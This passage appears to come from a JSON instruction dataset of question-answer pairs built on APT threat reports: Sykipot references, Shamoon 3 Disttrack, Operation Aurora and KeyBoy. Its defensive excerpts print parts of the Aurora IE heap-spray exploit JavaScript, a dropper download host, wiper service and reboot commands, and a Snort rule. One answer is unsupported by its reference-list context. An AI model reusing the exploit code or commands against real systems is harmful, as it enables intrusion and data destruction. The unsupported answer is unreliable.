Tool:\thttp://www.poisonivy\u00adrat.com/dl.php?file=230docs\nSophos Ltd.\t (2011, November 25).\t Detailed Analysis \u00adTroj/Agent\u00adUDR \u00adViruses and Spyware \u00adThreat Analyses \u00adThreat Center \u00adSophos. Retrieved\t December 8, 2011,\tfrom\t Sophos:\thttp://www.sophos.com/en\u00adus/threat\u00adcenter/threat\u00adanalyses/viruses\u00adand\u00adspyware/Troj~Agent\u00adUDR/detailed\u00adanalysis.aspx\nSophos Ltd.\t (2012, January\t19). Detailed Analysis \u00adTroj/Bdoor\u00adBDM \u00adViruses and Spyware \u00adThreat Analyses \u00adThreat Center \u00adSophos. Retrieved\t January\t31,\t 2012,\t from Sophos Threat\t Center: http://www.sophos.com/en\u00adus/threat\u00adcenter/threat\u00adanalyses/viruses\u00adand\u00adspyware/Troj~BDoor\u00adBDM/detailed\u00adanalysis.aspx\nSunbelt. (2009, October 15). Sunbelt CWSandbox Malware Analysis Report: Backdoor.Win32.Pasur. Retrieved\t December 19,\t 2011, from\t Sunbelt Security Sandbox:\t http://xml.ssdsandbox.net/archive/42e8163b7f08dd383e62e4bdb7f07c08\nSunbelt\t Security.\t (2009,\t May 03).\t Sunbelt CWSandbox Malware Analysis Report. Retrieved\t December 01, 2011, from Sunbelt Security\tSandbox:\t http://xml.ssdsandbox.net/archive/70a88091e1f9a7bee246488cce79936a\nSunbelt\t Security.\t (2009,\t October 16).\t Sunbelt CWSandbox Malware Analysis Report: Trojan.Win32.Sisproc.\t Retrieved\t December 19,\t 2011,\t from\t Sunbelt Security\t Sandbox: http://xml.ssdsandbox.net/archive/3fdea18b9610cbc9b63ba7a44899fbfb\nSunbelt\t Security.\t (2010,\t December 31). CWSandbox Report by MD5 \tat Sunbelt Security. Retrieved October 25,\t 2011,\tfrom Sunbelt Security: http://www.sunbeltsecurity.com/partnerresources/cwsandbox/md5.aspx?id=69ed8f7b0046956045a90 e36e3c83f6a\nSunbelt\t Security.\t (2010,\t May 12).\t GFI SandBox Analysis Report.\t Retrieved February\t 07,\t 2012, from\t Sunbelt Security\tSandBox: http://xml.ssdsandbox/archive/5bc597e48270f04ec9b683432432e352\nSunbelt Security.\t(2011,\t June 01). GFI SandBox Malware Analysis Report/ Trojan.Win32.Generic!SB.\t Retrieved January\t23,\t 2012,\t from GFI\tSandBox: http://xml.ssdsandbox.net/view/228191d05a09877f90c8b802617bb25f\nSymantec Corporation. (2010,\t March\t11).\t Backdoor.Sykipot At Work.\t Retrieved February\t02, 2012,\t from\t Symantec Connect Community: \thttp://www.symantec.com/connect/blogs/backdoorsykipot\u00adwork\nSymantec Corporation. (2012,\t January\t26).\t Insight into Sykipot Operations | Symantec Connect Community. Retrieved\t February 05, 2012,\t from\t Symantec Connect\t Community:\t http://www.symantec.com/connect/blogs/insight\u00adsykipot\u00adoperations\u00ad0\nTelus.\t (2011, August 03).\t Backdoor.Win32.Murcy.A \u00adTELUS\tSecurity\t Labs.\t Retrieved\t December 06, 2011,\t from\t TELUS\tSecurity Labs: \thttp://telussecuritylabs.com/threats/show/TSL20110803\u00ad01\nThakur,\t V.\t (2011,\tDecember 14).\t The\tSykipot Attacks\t | Symantec \tConnect Community. Retrieved\t February\t04, 2012,\t from Symantec Connect Community:\thttp://www.symantec.com/connect/blogs/sykipot\u00adattacks\nThreat Expert\t Ltd. (2010,\t June 15).\t ThreatExpert Report.\t Retrieved\t January 11,\t2012,\t from ThreatExpert: http://www.threatexpert.com/report.aspx?md5=b098aee16bd138c412075C9d315aefc9\nThreat Expert\t Ltd. (2011,\t July 26).\t ThreatExpert Report: Backdoor.Win32.Agent.anvj, Trojan\u00adDownloader.Delphi.\t Retrieved\t December 17,\t 2011,\t from\t ThreatExpert:\t http://www.threatexpert.com/report.aspx?md5=3e3736dffedaf2a0ae4d948567933b3f\nThreat Expert\t Ltd. (2011,\tNovember 04). ThreatExpert report: Mal/Behav\u00ad027, Backdoor:Win32/Idicaf.gen!B.\t Retrieved\t November 25,\t 2011, \tfrom\t ThreatExpert:\t http://www.threatexpert.com/report.aspx?md5=229947cc71a4601b8b7794b402e536a9\nThreat Expert\t Ltd. (2011,\t October 06).\t ThreatExpert Report: Mal/Behav\u00ad027, Virus/Win32.Atraps.CK.\t Retrieved November 21, 2011, from\t ThreatExpert: http://www.threatexpert.com/report.aspx?md5=da2f98315f4c56fce21273e21e453b76\nThreat Expert\t Ltd. (2011,\t September 25). ThreatExpert Report: TrojanDropper: Win32/Idicaf.C, Virus.Win32.Atraps.CK, Backdoor.Win32.Agent.bhxn.\t Retrieved\t December 25,\t 2011, from ThreatExpert: http://www.threatexpert.com/report.aspx?md5=f4c08d3df5ede0790e34eae0c5db8a7a\nThreat Expert\t Ltd. (2008,\t December 18).\t ThreatExpert Report: Mal/EncPk\u00adBL, Worm:Win32/Emerleox.J, Packed.Win32.Klone.af.\t Retrieved January\t15,\t 2012, from ThreatExpert: http://www.threatexpert.com/report.aspx?md5=37037f674bcbbb7eef3889ab6eb30268\nThreatExpert Ltd.\t (2010,\t March\t18). ThreatExpert Report: Troj/Agent\u00adMSC, BinImage/Agent.283805.\t Retrieved January\t26,\t 2012,\t from ThreatExpert:\t http://www.threatexpert.com/report.aspx?md5=2d8a9038e151fb30d45ea8668afd2a8e\nThreatExpert Ltd.\t (2011,\t December 09).\t ThreatExpert Report: Backdoor.Win32.Delf.abow, Trojan.Win32.CDur, Mal/Behav\u00ad058.. Retrieved February\t03,\t 2012,\t from ThreatExpert:\t http://www.threatexpert.com/report.aspx?md5=f0b848a841d4ef3406a6f9c4766c540b\nUS\u00adCERT.\t (2011,\t March\t 26).\t Early Warning and Indicator\t Notice\t(EWIN)\u00ad11\u00ad077\u00ad01A UPDATE.\t Retrieved\t January\t 06,\t 2011, from\t Incident Prevention and\t Detection:\t Protecting Information Security\t of\t National Banks:\t http://www.occ.treas.gov/news\u00adissuances/alerts/2011/alert\u00ad2011\u00ad4b.pdf\nVerisign. (2011).\t Verisign Authentication Services.\t Retrieved\t December 29, 2011, from Verisign Class 3\tCode Signing\t Certificate Revocation List: http://crl.verisign.com/CSC3\u00ad2009.crl\nWard, E.\t (2011, July\t 31).\t Backdoor.Murcy |\t Symantec.\t Retrieved January 05, 2011, from\t Symantec: http://www.symantec.com/security_response/writeup.jsp?docid=2011\u00ad080105\u00ad2030\u00ad99\nWikipedia.\t (n.d.).\t List of Intel microprocessors. Retrieved\t January\t21,\t 2012, from\t Wikipedia,\t the free encyclopedia: http://en.wikipedia.org/wiki/List_of_Intel_microprocessors\nWong,\t J.\t (2011,\t August 16).\t Encyclopedia entry:Backdoor.Win32/Thoper.A.\t Retrieved January\t24, 2012,\t from Microsoft\t Malware Protection Center: http://www.microsoft.com/security/portal/Threat/Encyclopedia/Entry.aspx?Name=Backdoor%3AWin 32%2FThoper.A\nXTiger \u00adCrackersoftware. (2011,\tFebruary\t14).\t All for\tDream... Retrieved December 23,\t 2011, from\t xdoors.net: http://www.xdoors.net/faq/index.html\nXTiger.\t (2010, April 28).\t forum.xdoors.net. Retrieved December 19, 2011, from\t xdoors.net: http://forum.xdoors.net/viewtopic.php?f=4&t=7\nXTiger.\t (2011, March 16). forum.xdoors.net. Topic: X\u00adDoor/X\u00adShell free download paused.\t Retrieved December 27, 2011,\tfrom forum.xdoors.net:\thttp://forum.xdoors.net/viewtopic.php?f=5&t=76\nXTiger.\t (2011). Xdoors.net.\t Retrieved December 23, 2011,\t from\t All for dream...:\thttp://www.xdoors.net\nXTiger.\t (n.d.).\t X\u00adShell.\t Retrieved\t December 23, 2011, from\t XDoors: http://www.xdoors.net/help/X\u00adShell.htm\n\nBased on the above text, answer a question. How did the malware used in the SK Communications hack locate its command and control (C2) servers, and why was this method effective?",
    "output": "The malware used in the SK Communications hack located its C2 servers by resolving callback domains into IP addresses using the Domain Name System (DNS) protocol. This method was effective because DNS is a ubiquitous and essential protocol for internet communication, making it difficult to block without disrupting legitimate traffic. By using DNS, the malware could dynamically locate its C2 servers even if their IP addresses changed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How might an adversary like the one behind the Seven-Pointed Dagger APT use Search Open Technical Databases: DNS/Passive DNS to gather information about potential targets, such as the Myanmar Union Election Commission (UEC)?",
    "output": "Search Open Technical Databases: DNS/Passive DNS involves querying nameservers or searching through centralized repositories of logged DNS query responses to gather information about a target organization. An adversary like the one behind the Seven-Pointed Dagger APT could use this technique to gather actionable information about potential targets, such as the Myanmar Union Election Commission (UEC). For example, they might search for DNS misconfigurations or leaks that reveal information about internal networks, or query nameservers to gather information about registered name servers, subdomains, mail servers, and other hosts. This information could be used to inform other forms of reconnaissance, establish operational resources, or gain initial access to the target's systems. In the case of the Seven-Pointed Dagger APT, the adversary was able to compromise the UEC website and use it to distribute malware, suggesting that they may have used DNS/Passive DNS searches to gather information about the UEC's online infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 1 Introduction\nThis section contains information on targeted attacks and its characteristics. In particular, we discuss two types of attacks: attacks targeting a specific company or organization, and attacks targeting specific software and IT infrastructure. We do this by comparing two outstanding examples of these two species of attack: Aurora and Stuxnet. This chapter provides information on some intriguing facts related to Stuxnet, such as timestamps of its binaries, and information on compiler versions which might be useful in analysis of the malware. We end with statistics relating to Stuxnet distribution all over the world.\nRecently, there has been increased public awareness and information about targeted attacks as the number of such attacks has significantly increased, becoming a separate cybercriminal business sector in its own right.\nMany companies are reluctant to disclose information about attempted or successful targeted attacks for fear of public relations issues affecting their profits, so the information made available to the public only represents a small part of what is actually happening.\n\nHow does the comparison between Aurora and Stuxnet in the context of targeted attacks help cyber security experts understand the characteristics and implications of these two types of attacks?",
    "output": "A: The comparison between Aurora and Stuxnet helps cyber security experts understand the different characteristics and implications of targeted attacks. Aurora represents an attack targeting a specific company or organization, while Stuxnet targets specific software and IT infrastructure. By analyzing these two examples, experts can gain insights into the methods, motivations, and potential impacts of each type of attack. For instance, examining timestamps of Stuxnet's binaries and compiler versions can provide valuable information for malware analysis. Additionally, understanding the global distribution statistics of Stuxnet can help experts assess the scope and reach of such attacks. This knowledge is crucial for improving defenses and response strategies against similar threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Shamoon 3 Targets Oil and Gas Organization\nBy Robert Falcone\nDecember 13, 2018\nSummary\nOn December 10, a new variant of the Disttrack malware was submitted to VirusTotal\n(SHA256:c3ab58b3154e5f5101ba74fccfd27a9ab445e41262cdf47e8cc3be7416a5904f) that shares a considerable amount of code with the Disttrack malware used in the Shamoon 2 attacks in 2016 and 2017 that we previously published , , and . While we could not identify the impacted organization from the malware, today Saipem they were attacked. In previous attacks, we were able to determine the impacted organization based on the domain names and credentials used by the Disttrack tool to spread to other systems on the network. However, that functionality was missing from this sample. Unlike past Shamoon attacks, this particular Disttrack wiper would not overwrite files with an image. Instead it would overwrite the MBR, partitions, and files on the system with randomly generated data.\nAccording to a , Saipem confirmed that they experienced a cyberattack that involved a variant of the Shamoon malware. The attack caused infrastructure and data availability issues, forcing the organization to carry out restoration activities. Saipem told that 300 systems on their network were crippled by the malware related to the 2012 Shamoon attacks. While we cannot definitively confirm that Saipem was the impacted organization, the timing of this incident with the emergence of the Disttrack sample discussed in this blog is quite coincidental.\nDropper\nThe sample submitted to VirusTotal is a Disttrack dropper, which is responsible for installing a communications and wiper module to the system. The dropper is also responsible for spreading to other systems on the same local network, which it accomplishes by attempting to log into other systems on the network remotely using previously stolen usernames and passwords. Unfortunately, this particular sample does not contain any domains, usernames, or passwords to perform this spreading functionality, so this sample would only run on the system in which it was specifically executed.\nThe dropper has a hardcoded kill time of '12/7/17 23:51\u2032; if the system date is after this date the dropper installs the wiper module and starts wiping files on the system. The dropper reads the '%WINDOWS%\\inf\\mdmnis5tQ1.pnf' file to obtain a custom kill date that it will use instead of the hardcoded time. The communications module installed by the dropper writes to this file, which will be discussed in a later section. The dropper also decrypts a string '\\inf\\averbh_noav.pnf' that is the other file that the communications module uses to write system information to and if the wiper was able to successfully wipe the system, but the dropper does not appear to use this file.\nThe dropper has three resources, two of which contain embedded modules, specifically a communications module and a wiper module. The third resource contains an x64 variant of the dropper, which it will use if the architecture of the system is determined to be x64. The resources have a language set to 'SUBLANG_ARABIC_YEMEN' that was also found in the previous Disttrack samples used in Shamoon 2 attacks. The resource names are PIC, LNG, and MNU, which are slightly altered versions of the ICO, LANG, and MENU names found in previous samples.\nThe dropper extracts modules from these resources by seeking a specific offset and reading a specific number of bytes as the length of the ciphertext. The dropper then decrypts the ciphertext by using an XOR cipher and a specific base64 encode string that is decoded and used as the key. Before accessing the ciphertext, the dropper subtracts 14 from the specified offset, which is the same as previous Disttrack samples delivered in Shamoon 2 attacks. Tables 1, 2, and 3 include the resources, the information used to extract them, and the resulting module.\nThe dropper will install itself to the system (and remote systems if spreading was possible) by creating a service with the attributes listed in Table 4 below.\nThe dropper chooses a random name when installing the communication and wiper modules to the system. The communications module will have one of the following filenames with the 'exe' file extension:\nnetnbdrve\nprnod802\nnetrndiscnt\nnetrtl42l\nmdmadccnt\nprnca00\nbth2bht_ibv32\ncxfalcon_ibL32\nmdmsupr30 digitalmediadevicectl mdmetech2dmv\nnetb57vxx\nwinwsdprint\nprnkwy005\ncomposite005 mdmar1_ibv32 prnle444 kscaptur_ibv32 mdmzyxlga usbvideob\ninput_ibv48\nprnok002_ibv\naverfx2swtvZ\nwpdmtp_ibv32\nmdmti_ibv32\nprintupg_ibv32\nwiabr788\nThe wiper module will have one of the following filenames with the 'exe' file extension:\n_wialx002\n__wiaca00a\ntsprint_ibv\nacpipmi2z\nprnlx00ctl\nprngt6_4\narcx6u0\n_tdibth\nprncaz90x\nmdmgcs_8\nmdmusrk1g5\nnetbxndxlg2\nprnsv0_56\naf0038bdax\naverfix2h826d_noaverir\nmegasasop\nhidirkbdmvs2\nvsmxraid\nmdamx_5560\nwiacnt7001\nWiper\nThe wiper module (SHA256: 391e7b90bf3f0bfeb2c2602cc65aa6be4dd1c01374b89c4a48425f2d22fe231c) that the dropper writes to the system is responsible for overwriting the data within the MBR, partitions, and files on the system. The wiper carries out this wiping using a legitimate hard disk driver called RawDisk by ElDos. The wiper contains the ElDos RawDisk driver in a resource named 'e' that it extracts by skipping to offset 1984 and reading 27792 bytes from that offset. It then decrypts the data using aa 247-byte key and saves it to '%WINDOWS%\\system32\\hdv_725x.sys'. The wiper then creates a service named 'hdv_725x' for this driver using the following command line command and runs it with \"sc start hdv_725x\":\nsc create hdv_725x type= kernel start= demand binpath= %WINDOWS%\\system32\\hdv_725x.sys\nThis wiper was configured using the 'R' flag, which generates a buffer of random bytes that it will use to overwrite the MBR, partitions and files. The sample supports two additional configuration flags as well, specifically 'F' and 'E' flags that will either overwrite files using a file or encrypt its contents.\nThe wiper could be configured to use a file to overwrite the files on the disk using the 'F' configuration flag, as we saw images used to overwrite files in previous Shamoon attacks. This file would be stored in a resource named 'GRANT', but this particular wiper is not configured to use a file for overwriting so the GRANT resource does not exist. If it were configured to use a file, this sample would extract the file using the information listed in Table 5.\nThis sample is also capable of being configured to import an RSA key to encrypt the MBR, partitions, and files via configuration flag 'E'. This sample was not configured to encrypt files, and the RSA key is empty in the wiper.\nAfter completing this wiping functionality, the sample will reboot the system using the following command line, which will render it unusable when the system reboots as the important system locations and files have been overwritten with random data:\nshutdown -r -f -t 2\nCommunications\nThe communications module (SHA256: 0694bdf9f08e4f4a09d13b7b5a68c0148ceb3fcc79442f4db2aa19dd23681afe) dropped by the Disttrack dropper will use the following two supporting files:\n%WINDOWS%\\inf\\mdmnis5tQ1.pnf \u2013 Used to set a wipe date for associated wiper module\n%WINDOWS%\\inf\\averbh_noav.pnf \u2013 Used to mark successful wiping\nThe communications module is responsible for reaching out to hardcoded URLs to communicate with the C2 server, but like previous Disttrack samples, this communication module does not contain functional C2 domains to use in the URLs. If it did, it would create a URL with a parameter named 'selection' followed by system information and the contents of the 'averbh_noav.pnf' file, as seen here:\n[C2 URL, empty]?selection=[system info and contents of averbh_noav.pnf]\nWhen communicating with the C2 URL, the communications module would use a User Agent of 'Mozilla/13.0 (MSIE 7.0; Windows NT 6.0)', which is the same as past Disttrack communication module samples. Table 6 below show the two commands the C2 could respond with that the communications module could handle.\nConclusion\nThe Disttrack sample uploaded to VirusTotal is a variant of the samples used in the Shamoon 2 attacks in 2016 and 2017. The tool does not have the capability to spread to other systems on the local network. Instead it would have to be loaded onto and executed on the system that the actors intend to wipe. The wipe date of '12/7/2017\u2032 does not seem timely. However, this older date is still effective as the Disttrack dropper will install and run the wiper module as long as the system date is after the wipe date. Unlike past Shamoon attacks, this particular Disttrack wiper would not overwrite files with an image. Instead, it would overwrite the MBR, partitions and files on the system with random data. While we can't confirm this sample was used in the Saipem attack, it is likely at least related to it.\nPalo Alto Networks customers are protected from this threat:\nWildFire detects all samples associated with this attack with malicious verdicts\nAutoFocus customers can track this attack and previous Shamoon attacks using the\nIndicators of Compromise\nc3ab58b3154e5f5101ba74fccfd27a9ab445e41262cdf47e8cc3be7416a5904f \u2013 Disttrack Dropper x86 0975eb436fb4adb9077c8e99ea6d34746807bc83a228b17d321d14dfbbe80b03 \u2013 Disttrack Dropper x64 0694bdf9f08e4f4a09d13b7b5a68c0148ceb3fcc79442f4db2aa19dd23681afe \u2013 Disttrack Comms module x86 391e7b90bf3f0bfeb2c2602cc65aa6be4dd1c01374b89c4a48425f2d22fe231c \u2013 Disttrack Wiper module x86 6985ef5809d0789eeff623cd2436534b818fd2843f09fa2de2b4a6e2c0e1a879 \u2013 ElDos RawDisk Driver x86 ccb1209122085bed5bded3f923835a65d3cc1071f7e4ad52bc5cf42057dd2150 \u2013 Disttrack Comms module x64 dab3308ab60d0d8acb3611bf364e81b63cfb6b4c1783864ebc515297e2297589 \u2013 Disttrack Wiper module x64 bc4513e1ea20e11d00cfc6ce899836e4f18e4b5f5beee52e0ea9942adb78fc70 \u2013 ElDos RawDisk Driver x64 \u00a9 2019 Palo Alto Networks, Inc. All rights reserved.\n\nWhat role does the communications module play in the Shamoon 3 Disttrack attack, and how does it interact with the C2 server?",
    "output": "The communications module in the Shamoon 3 Disttrack attack is responsible for reaching out to hardcoded URLs to communicate with the Command and Control (C2) server. It uses two supporting files: '%WINDOWS%\\\\inf\\\\mdmnis5tQ1.pnf' to set a wipe date for the associated wiper module, and '%WINDOWS%\\\\inf\\\\averbh_noav.pnf' to mark successful wiping. The module creates a URL with a parameter named 'selection' followed by system information and the contents of the 'averbh_noav.pnf' file. It uses a specific User Agent string for communication. Understanding this interaction helps cybersecurity experts detect and block C2 communications, thereby disrupting the attack chain.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: DETECT, DIAGNOSE, RESPOND\nCyber Espionage is a critical issue. Over 80% of intellectual property is stored online digitally. The computing infrastructure in a typical Enterprise is more vulnerable to attack than ever before. Current security solutions are proving ineffective at stopping cyber espionage. Malware is the single greatest problem in computer security today. Yet, malware represents only the tip of the spear. The true threat is the human being who is operating the malware. This human, or the organization he represents, is the true threat that is targeting information for the purposes of financial gain, theft of state secrets, and theft of intellectual property. True threat intelligence requires reaching beyond malware infections to identify the individuals, country of origin, and intent of the attacker.\nMedium Headline: ATTRIBUTION\nAt this time, there is very little available in terms of attribution. A CRC algorithm tends to indicate the malware package is of Chinese origin, and many attacks are sourced out of a service called 3322.org + a small company operating out of Changzhou. The owner is Peng Yong, a Mandarin speaker who may have some programming background with such algorithms. His dynamic DNS service hosts over 1 million domain names. Over the last year, HBGary has analyzed thousands of distinct malware samples that communicate with 3322.org. While Peng Yong is clearly tolerant of cyber crime operating through his domain services, this does not indicate he has any direct involvement with Aurora.\nMedium Headline: JAVASCRIPT AND SHELLCODE\nThe JavaScript based attack vector associated with Operation Aurora was published in the public domain in early January 2010. Microsoft details the vulnerability in Security Bulletin MS10+002. Internet Explorer 5.01, Internet Explorer 6, Internet Explorer 6 Service Pack 1, Internet Explorer 7, and Internet Explorer 8 (except Internet Explorer 6 for supported editions of Windows Server 2003) are affected. Exploit code analyzed by HBGary reveals that only Internet Explorer 6 was targeted during Operation Aurora. This vulnerability can be leveraged by attackers of varying skill levels due to the public availability of the Metasploit module \"ie_aurora.rb\" . The exploit code used by the original attackers was quickly improved and added to Metasploit thus greatly expanding the potential number of attackers and reliability of code.\nThe JavaScript performs a heap spray attack and injects the embedded shellcode described below. The JavaScript exploits the vulnerability in Internet Explorer by copying, releasing, and then referencing a Document Object Model (DOM) element.\nVery Small Headline: SECTION REMOVED FOR SPACE...\n8%udfa7%ufa4a%uc6a8%ubc7c%u4b37%u3cea%u564c%ud2cb%ua174%u3ee1%u1c40%uc755%u8fac%ud5be%u9b27%u7466%u4003%uc8d2%u5820%u770e%u2342% ucd8b%ub0be%uacac%ue2a8%uf7f7%ubdbc%ub7b5%uf6e9%uacbe%ub9a8%ubbbb%uabbd%uf6ab%ubbbb%ubcf7%ub5bd%uf7b7%ubcb9%ub2f6%ubfa8%u00d8\");\nvar sss = Array (826, 679, 798, 224, 770, 427, 819, 770, 707, 805, 693, 679, 784, 707, 280,\n238, 259, 819, 336, 693, 336, 700, 259, 819, 336, 693, 336, 700, 238, 287, 413, 224, 833,\nSECTION REMOVED FOR SPACE...\n735, 427, 336, 413, 735, 420, 350, 336, 336, 413, 735, 301, 301, 287, 224, 861, 840, 637,\n735, 651, 427, 770, 301, 805, 693, 413, 875);\nvar arr = new Array; for (var i = 0; i < sss.length; i ++) { arr[i] = String.fromCharCode (sss [i] / 7);\n}\nvar cc = arr.toString (); cc = cc.replace (/,/g, \"\"); cc = cc.replace (/@/g, \",\"); eval (cc);\nvar x1 = new Array (); for (i = 0; i < 200; i ++) { x1 [i] = document.createElement (\"COMMENT\"); x1 [i].data = \"abc\";\n};\nvar e1 = null;\nfunction ev1 (evt) { e1 = document.createEventObject (evt); document.getElementById (\"sp1\").innerHTML = \"\"; window.setInterval (ev2, 50);\n}\nfunction ev2 () {\np = \"\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u 0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0\nd\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\"; for (i = 0; i < x1.length; i ++) {\nx1 [i].data = p;\n}; var t = e1.srcElement;\n}\n</script>\n</head> <body>\n<span id=\"sp1\"><IMG SRC=\"aaa.gif\" onload=\"ev1(event)\" width=\"16\" height=\"16\"></span>\n</body> </html>\nThe shellcode exists as a Unicode escaped variable (sc) in the malicious JavaScript listed below. Upon successful exploitation of Internet Explorer, the shellcode will download an obfuscated second stage executable from http://demo1.ftpaccess.cc/demo/ad.jpg which is the dropper. Note: these files are specific to the sample we analyzed at HBGary, Inc. The attackers must use a second stage download mechanism to achieve full system access due to memory constraints. It is unlikely that the final payload could be delivered through the original exploit given these conditions. The dropper is XOR encrypted with a 0x95 key. The shellcode copies this encrypted binary to the user's AppData directory as \"a.exe\". The shellcode then decrypts \"a.exe\" and moves it to \"b.exe\" in the same directory. Then \"b.exe\" is executed. The following actionable intelligence can be used to identify exploit remnants in the heap space of Internet Explorer post exploitation attempt. These patterns can be searched for when doing memory analysis of a victim system.\nThe following SNORT rules have been released by the Emerging Threats project to detected the final payload command and control communications.\nMedium Headline: DROPPER\nThe initial dropper is merely a detonation package that decompresses an embedded DLL into the Windows system32 directory and loads it as a service. The initial dropper is likely to be packed (UPX, etc). The dropper has an embedded DLL that is decompressed to the windows system32 directory. This DLL will be named to resemble existing services (rasmon.dll, etc). In order to evade forensics, the file+time of the dropped DLL will be modified to match that of an existing system DLL (user32.dll, etc). The dropped DLL is loaded into its own svchost.exe process. Several registry keys are created and then deleted as part of this process. Finally, the dropper deletes itself from the system by using a dissolving batch file (DFS.BAT, etc).\nMedium Headline: PAYLOAD\nThe payload uses two+stage installation. During stage one, the dropper will install the payload as a service running under the name Ups??? (where ??? are three random characters). Once executing, the payload will immediately delete the first service and enter stage+two. During stage+two, the payload will register a new, second service under the name RaS??? (where ??? are three random characters). This new service will point to the same backdoor DLL, no new files are involved. Note: the three character prefixes Ups and RaS can easily be modified by the attacker. Once the new service is registered, the payload will access an embedded resource that is encrypted. The decryption goes through several phases. The encrypted data block contains the DNS name for the command and control server (homeunix.com, etc). This data block is configurable before the malware is deployed. The data block length is hard+coded (0x150 or 336 bytes). During phase one, this data block is fed through a simple XOR (0x99), resulting in an ASCII+string. Next, the resulting ASCII+string is fed into a base64 decoding function, producing a binary string. Finally, the resulting base64 decoded binary string is fed through another XOR (0xAB), resulting in clear+text. The three primary encryption loops are colored and marked in Figure 1. The resulting clear+text buffer contains several fields in both ASCII and UNICODE, including the C&C server address.\nGLANCE UNDER THE HOOD\nbuffer after phase one XOR: mJ2bhcPExs7excLThcjExqurnauYq\nbuffer after base64 decoding: \u00c3\u00c4\u00c6\u00ce\u00de\u00c5\u00c2\u00d3\u2026\u00c8\u00c4\u00c6\u00ab\u00ab \u00ab\u02dc\u00ab\u0178\u00ab\"\u00ab\u2020\u00ab\u0161\u00ab\u0161\u00ab\u017e\u00ab\u0161\u00ab\u0153\nThe payload will create additional registry keys.\nOther potential dropped files, as reported by McAfee:\nMedium Headline: COMMAND AND CONTROL\nThe payload communicates with its command and control server over port 443. The source port is randomly selected. While outbound traffic appears to be HTTPS, the actual traffic uses a weak custom encryption scheme. The command and control packets have a very specific formativ .\nThe payload section is encrypted with a key selected by using GetTickCount. This means each infected node has its own key. The key is embedded in the header of the packet, and is easily recovered.\nMedium Headline: HOW THE MALWARE WORKS\nThe primary control logic can be found in the module registered under the service key (rasmon.dll, etc.). This module has been written in c and includes several specific methods and encodings that provide forensic track+ability.\nThe above screenshot illustrates a REcon(tm) trace on the malware dropper and subsequent service creation. Location A. represents the dropper program, which unpacks itself and decompresses a file to the system32 directory. Point B. represents the initial svchost.exe startup, which is loading the malware payload. Location C. is the actual execution of the malware service, which remains persistent. At points E. and F. you can see the malware checking in with the command and control server. Finally, location D. represents the dissolvable batch file which deletes the initial dropper and then itself.\nFIGURE 1 - BASE64 AND XOR ENCRYPTION SCHEME\nFIGURE 2 -C&CCOMMAND PARSER\nQuestion: How does the Aurora payload communicate with its command and control server, and what encryption scheme does it employ?",
    "output": "Answer: The Aurora payload communicates with its command and control server over port 443. While the outbound traffic appears to be HTTPS, it actually uses a weak custom encryption scheme. The command and control packets have a specific format, and the payload section is encrypted with a key selected using GetTickCount, meaning each infected node has its own unique key. This key is embedded in the header of the packet and is easily recoverable.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Detecting Infections\nWhile these are clearly not widespread attacks and, as in any other targeted attack case, we should not create alarmism for threats that are likely irrelevant for the majority of organizations, we want to share a few indicators that might help identify infections or assist in further research by whoever is interested in this campaign.\nFirstly, thanks to the fixed patterns used by the malware in the authentication procedure, we can detect outbound traffic from infected hosts with the following simple Snort rule:\nalert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:\"KeyBoy Backdoor Login\"; flow:to_server; content:\"|c4 4c 87 3f 11 1e c4 1a|\"; depth:8; sid:1000001; rev:1; classtype:trojan-activity; reference:url,community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-tar geted-attacks-against-vietnam-and-india)\nThe simplest way to identify an infection on a given Windows system, is just to look for the existence of the file C:\\WINDOWS\\system32\\CREDRIVER.dll or of a service called MdAdum.\nWe also created a couple of Yara rules that you can use to scan your systems your collection of malware samples to identify copies of KeyBoy:\nBig Headline: Conclusions\nNot a day passes by without hearing of someone hit by a targeted attack. Recently the growth of amount\nand scale of targeted attacks has come to the point were they are starting to look more like opportunistic carpet bombings rather than ninja strikes. It's common to observe attacks pulled off successfully without any particular sophistication in place, including the incidents described in this post.\nIt's also getting quite difficult to attribute the attacks to any state-sponsored unit, both because there's a generic lack of strong evidence in such incidents (which is why we refrained from making any statement on the origin of these intrusions) but frankly also because almost anybody could operate such campaigns and be reasonably successful. The only differentiation between actors at this point exclusively relies on identifying the motivations and the context.\nBeware though, just because these attacks are conceptually targeted, it doesn't necessarily mean that they should have a higher priority than any other threat on your security program. Our suggestion remains the same: identify your core assets, recognize the most impactful threats to such assets and inform and protect yourself accordingly.\nThis research was brought to you by (<http://twitter.com/botherder>)Claudio Guarnieri and (<http://twitter.com/repmovsb>)Mark Schloesser from Rapid7 Labs.\nRead the text above and answer this question: What are the key indicators that can help identify a KeyBoy infection on a Windows system? Why are these indicators effective in detecting the presence of the malware?",
    "output": "The key indicators that can help identify a KeyBoy infection on a Windows system are the existence of the file `C:\\WINDOWS\\system32\\CREDRIVER.dll` or the presence of a service called `MdAdum`. These indicators are effective in detecting the presence of the malware because they represent specific artifacts left behind by the KeyBoy backdoor during its installation and operation on the compromised system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
